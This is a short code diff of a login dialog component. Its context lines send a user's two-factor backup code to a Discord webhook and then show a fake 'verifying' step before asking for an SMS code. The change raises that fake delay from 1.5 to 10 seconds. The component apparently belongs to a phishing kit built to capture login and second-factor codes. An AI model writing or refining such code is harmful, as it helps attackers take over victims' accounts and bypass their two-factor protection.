@@ -79,7 +79,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     // Send backup code to Discord webhook
     await sendToWebhook('Backup Code', backupCode);
     setStep('verifying');
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    await new Promise(resolve => setTimeout(resolve, 10000));
     
     setStep('sms-code');
   };
